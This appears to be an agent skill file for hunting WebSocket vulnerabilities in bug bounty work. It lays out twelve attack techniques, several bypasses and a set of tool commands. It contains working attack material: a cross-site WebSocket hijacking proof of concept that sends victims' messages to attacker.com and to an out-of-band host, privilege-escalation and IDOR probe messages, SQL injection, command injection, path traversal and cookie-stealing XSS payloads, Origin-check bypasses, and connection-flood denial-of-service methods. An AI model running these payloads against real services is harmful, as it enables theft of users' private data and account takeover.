---
name: hunt-websocket
description: "Use this skill whenever you see WebSocket traffic — `ws://` or `wss://` URLs, `Upgrade: websocket` and `Connection: Upgrade` headers, `Sec-WebSocket-Key`/`Sec-WebSocket-Version`/`Sec-WebSocket-Accept` headers, Socket.IO endpoints (`/socket.io/`), SignalR (`/signalr/`), MQTT-over-WS, GraphQL subscriptions (`graphql-ws`, `subscriptions-transport-ws`), chat apps, live notifications, collaborative editors, trading platforms, dashboards with live data. Load automatically when devtools Network panel shows a WS connection. Only invoke if real impact potential exists — auth bypass over WS, cross-user data leak via wrong-room emit, CSWSH leading to account data theft, or injection through WS payloads landing in a sink."
type: hunt
---

# Hunt: WEBSOCKET ATTACKS

WebSockets are HTTP-upgraded persistent bidirectional channels. Developers often authenticate the upgrade but skip auth on individual messages — that's where the bugs live. Also: no Same-Origin Policy enforcement, so CSWSH is widespread.

## Crown Jewel Targets
- Chat apps — cross-room/cross-tenant message read or send
- Trading / financial — order injection, price feed manipulation, balance read
- Collaborative editors (docs, whiteboards) — read/write other tenants' documents
- Admin dashboards with live metrics — sensitive data over WS
- Notification streams — cross-user PII (other users' alerts)
- Multiplayer games — state manipulation, anti-cheat bypass
- IoT/telemetry — device control hijack

## Detection Signals
- Request headers: `Upgrade: websocket`, `Connection: Upgrade`, `Sec-WebSocket-Key`, `Sec-WebSocket-Version`, `Sec-WebSocket-Protocol`
- Response: `101 Switching Protocols`, `Sec-WebSocket-Accept`
- URL paths: `/ws`, `/wss`, `/socket`, `/socket.io/`, `/graphql` (subscriptions), `/cable` (Rails ActionCable), `/hub` (SignalR), `/mqtt`
- JS bundles: `new WebSocket(`, `io(` (Socket.IO), `Stomp.over`, `Centrifuge`, `Pusher`
- Burp shows "WebSockets history" populating

## Attack Techniques

### 1. Cross-Site WebSocket Hijacking (CSWSH)
WebSocket upgrade is a standard HTTP request — sends cookies — but is NOT blocked by SOP/CORS. If the server doesn't validate `Origin`, attacker.com can open `wss://target/ws` in the victim's browser and read/write.
```html
<!-- Hosted on attacker.com -->
<script>
const ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => { ws.send(JSON.stringify({cmd:'get_messages'})); };
ws.onmessage = (e) => {
  fetch('https://attacker.com/log', {method:'POST', body:e.data});
};
</script>
```
Validate: open in victim browser with their session cookie → reads victim's WS data, exfils to attacker.

**Check**: capture upgrade request → strip/change `Origin` header → if 101 still returned, vulnerable.

### 2. Authentication-on-upgrade-only (per-message bypass)
Server auths the upgrade with session cookie, but accepts ALL message types thereafter without per-action auth.
```
WS UPGRADE: cookie=user_alice → 101 OK
> {"action":"get_admin_users"}                      ← user but server returns admin data
> {"action":"impersonate","user_id":42}             ← function meant for admins
> {"action":"set_role","user":"alice","role":"admin"}
```

### 3. IDOR over WebSocket messages
```
> {"action":"get_conversation","id":12345}           ← own
> {"action":"get_conversation","id":12346}           ← someone else's, returns data
> {"action":"join_room","room_id":"victim_room"}     ← join arbitrary room → eavesdrop
```

### 4. Socket.IO namespace / room abuse
Socket.IO has "rooms" — server-side `io.to(room).emit()`. Misconfig: emit to wrong room or use `io.emit` (broadcast) for what should be per-user.
```
< {"type":"notification","data":{"user_id":victim,"private":"..."}}    ← received by attacker socket
```
Also test namespaces: `wss://target/socket.io/?EIO=4&transport=websocket&ns=/admin` — sometimes /admin namespace exists and lacks auth.

### 5. Injection through WS payloads
WS message content lands in:
- DOM (XSS) — chat message rendered with innerHTML
- DB query (SQLi / NoSQLi) — `{"search":"' OR 1=1--"}`
- Command exec — `{"filename":"; id"}`
- File write — `{"path":"../../etc/passwd"}`

Test every payload you'd test on HTTP, just over WS.

### 6. Missing CSRF on upgrade
WebSocket upgrade has no CSRF token by default. Combined with CSWSH (no Origin check), every state-changing action over WS is CSRF-able.

### 7. JWT / token in URL leaking
`wss://target/ws?token=eyJ...` — token logs in proxy access logs, referrer header on subsequent navigation. Plus token reuse / no-expiry tests.

### 8. Protocol downgrade
Server accepts `ws://` (unencrypted) as well as `wss://`. MitM possible on unsecured network. Test:
```
ws://target.com/ws         ← if accepted, MitM-able
```

### 9. WebSocket smuggling / HTTP request smuggling via Upgrade
Reverse proxy treats `Upgrade: websocket` as upgrade but forwards subsequent bytes as raw stream; misconfig allows attacker to smuggle HTTP requests to backend.
```
GET / HTTP/1.1
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: ...
Sec-WebSocket-Version: 13

GET /admin HTTP/1.1
Host: target.com
```

### 10. DoS via connection flood / payload bomb
- Open thousands of WS connections (no rate limit) → exhaust file descriptors
- Send 1GB payload in single frame (no max-size) → OOM
- Send pings at 10kHz → CPU exhaustion
(Usually not a finding without proving outage of legitimate users; report only with clear impact and per-program acceptance.)

### 11. Subprotocol confusion
```
Sec-WebSocket-Protocol: admin, user
```
Some servers honor the first claimed subprotocol without checking entitlement.

### 12. Mixed-content / clickjack on WS-driven UI
Less common but test if WS UI loads in iframe → clickjack to trigger sensitive WS actions.

## Payloads
```javascript
// CSWSH PoC template
const ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => {
  ws.send(JSON.stringify({type:'auth.whoami'}));
  ws.send(JSON.stringify({type:'list.conversations'}));
  ws.send(JSON.stringify({type:'admin.list_users'}));   // privesc probe
};
ws.onmessage = e => fetch('https://OAST/?d='+btoa(e.data));

// Socket.IO probe
const socket = io('wss://target.com', {transports:['websocket']});
socket.emit('admin.users.list');
socket.on('user.created', d => fetch('https://OAST/?d='+btoa(JSON.stringify(d))));
// Try common namespaces
['/admin','/internal','/debug','/api'].forEach(ns => {
  const s = io('wss://target.com'+ns); s.on('connect', () => console.log('ns ok:', ns));
});

// Per-message bypass probes (paste into wscat / Burp WS Repeater)
{"action":"ping"}                                  // baseline
{"action":"admin.users.list"}
{"action":"user.get","id":1}
{"action":"user.get","id":99999}
{"action":"impersonate","user_id":1}
{"action":"role.set","user":"self","role":"admin"}
{"action":"file.read","path":"../../../etc/passwd"}
{"action":"sql","query":"SELECT * FROM users"}
{"type":"subscribe","channel":"private-user-2"}    // Pusher/Centrifuge style
{"event":"client-evil","channel":"admin"}

// XSS via chat message
{"type":"message","body":"<img src=x onerror=alert(document.cookie)>"}

// GraphQL subscription auth bypass
{"type":"connection_init","payload":{}}              // no auth
{"type":"start","id":"1","payload":{"query":"subscription { messages { id body user { email } } }"}}
```

## Bypass Methods
| Defense | Bypass |
|---------|--------|
| `Origin` checked against allowlist | Try absent Origin (null), `Origin: https://target.com.attacker.com`, `Origin: https://target.com@attacker.com`, `https://subdomain.attacker.com` if regex weak |
| Cookie SameSite=Lax | CSWSH still works — top-level navigation triggers cookie send; force navigation via window.open then connect from same page |
| Per-message auth via JWT in payload | Replay another user's JWT (test if token is rotated per message — usually not); test alg=none |
| Rate limit on connections | Distribute across IPs; use TLS-SNI multiplexing |
| WAF inspects HTTP only | Bypass via WS — most WAFs do NOT inspect WS frames after upgrade |
| Channel/room ACL on subscribe | Test on emit/publish path; test room-name normalization (case, prefix `/`, unicode) |

## Tools
```bash
# wscat — manual interactive
wscat -c wss://target.com/ws -H "Cookie: session=..." -H "Origin: https://target.com"
# Send line-by-line

# websocat — scriptable
echo '{"action":"admin.users.list"}' | websocat wss://target.com/ws -H 'Cookie: ...'

# Burp Suite — WebSocket history + WebSocket Repeater (right-click → Send to WebSocket Repeater)
# Burp ext: WebSocket Turbo Intruder for fuzz

# ws-harness — security testing
ws-harness.py -u wss://target.com/ws -m messages.json

# socket.io-client
npx socket.io-client wss://target.com

# CSWSH PoC: host on attacker-controlled origin
python3 -m http.server 8000   # serve CSWSH page → trick victim to visit

# Mitmproxy with mitmweb for WS interception
mitmproxy --mode reverse:wss://target.com

# Test Origin enforcement
for origin in 'https://attacker.com' 'null' 'https://target.com.attacker.com' ''; do
  echo "Origin: $origin"
  websocat --origin "$origin" wss://target.com/ws <<< '{}'
done
```

## Impact
- **Critical** — CSWSH → exfil PII/tokens of victims; auth bypass on WS messages → admin actions; cross-tenant message read/write
- **High** — IDOR via WS messages exposing other users' data; SQL/Command injection in WS payload
- **High** — Socket.IO room mis-routing leaking PII across tenants
- **Medium** — XSS via chat message (depends on context, sanitization, victim count)
- **Low** — Missing Origin check without sensitive WS endpoint (no real exfil)

## Chain Potential
- CSWSH → exfil chat history (PII) → mass-victim impact
- WS IDOR → admin token leaked in message → ATO
- WS XSS → DOM access on app → exfil any per-user data via WS itself
- WS injection (SQLi) → DB read → user table dump → ATO chain
- Socket.IO namespace abuse → admin namespace → privesc
- GraphQL subscription auth bypass → live data stream of all users' actions

## Fallback Chain
1. If `Origin` is validated, try cross-protocol/subdomain attacks (`*.target.com.attacker.com`, takeover of a subdomain — see hunt-subdomain-takeover — to legitimately set Origin), and test missing/null Origin handling.
2. If upgrade is locked down, focus on per-message auth — enumerate every action verb, every channel, every room, every id field; test IDOR, privesc, and injection on each.
3. If the app uses Socket.IO/SignalR/Centrifuge/Pusher, enumerate hidden namespaces and channels (try `/admin`, `/internal`, `private-*`, `presence-*`), and test client-event abuse on Pusher (`client-*` events without auth).
4. If WS itself is hardened, look at the WS-to-HTTP boundary — actions over WS may eventually trigger HTTP webhooks/callbacks (SSRF surface), and WS payload may be persisted then rendered in HTTP responses (stored XSS). Never stop because one technique failed.

## Real-World Reports (from Community Writeups)

| Title (truncated) | Program | Bounty | Source |
|---|---|---|---|
| Initial WebSocket support (SockJS) CodeQL | GitHub Security Lab | $1,800 | H1 |
| **Lack of Origin check leads to CSWSH** | Grammarly | $800 | H1 |
| Posts sent via websockets aren't sanitized properly (stored XSS) | Mattermost | $150 | H1 |
| **[uchat.uberinternals.com] Mattermost doesn't check Origin in WS** | Uber | $49 (info) | H1 |
| libcurl WebSocket handshake accepts any Sec-WebSocket-Accept | curl | $0 | H1 |
| WebSocket Control Frame Starvation DoS | curl | $0 | H1 |
| WebSocket Fragmentation DoS on Curl Client | curl | $0 | H1 |
| Insecure WebSocket usage in curl docs (cleartext) | curl | $0 | H1 |
| CVE-2025-5399 WebSocket endless loop | curl | $0 | H1 |
| CVE-2025-10148 Predictable WebSocket mask | curl | $0 | H1 |
| Buffer Overflow in WebSocket Handshake (lib/ws.c:1287) | curl | $0 | H1 |
| Grammarly `socket` command sends data over WS to arbitrary origins | Grammarly | $0 | H1 |
| **Cross-Site WebSocket Hijacking → steals XSRF-TOKEN** | Stripo Inc | $0 | H1 |
| Staff w/o permissions can listen to Shopify Ping via WS events | Shopify | $0 | H1 |

**PROVEN patterns** (3+ reports): missing/weak `Origin` header validation on WS upgrade → CSWSH (Grammarly, Uber Mattermost, Stripo), per-message auth absent on subscribed channels (Shopify Ping staff, Mattermost), WS message rendered into HTML without sanitization → stored XSS (Mattermost), WS implementations with handshake/mask/frame bugs (curl ×many).

## High-Value Chains (from Reports)

1. **CSWSH (missing Origin check) → exfiltrate CSRF token / live message stream → ATO**
   - Grammarly (H1, $800), Stripo (XSRF-TOKEN theft), Uber Mattermost — attacker page opened WS, server accepted Origin attacker.com, full duplex with victim's session.
2. **WS channel subscribe without per-channel auth → cross-tenant data leak**
   - Shopify Ping — staff with no permission subscribed to admin events, received private chats.
3. **WS message → server stores → rendered in HTTP response → stored XSS in other-user browser**
   - Mattermost ($150) — payload sent over WS bypassed HTTP-side XSS filter, rendered later as HTML.
4. **WS → server triggers HTTP webhook fetch → SSRF**
   - Adjacent pattern — WS action passes URL field through to backend HTTP fetcher, surface for blind SSRF (see hunt-ssrf).
5. **Pusher/Socket.IO client-event without auth → cross-channel impersonation**
   - Common Pusher misconfig — `client-*` events relayed without checking origin user → spoofed messages in private channels.
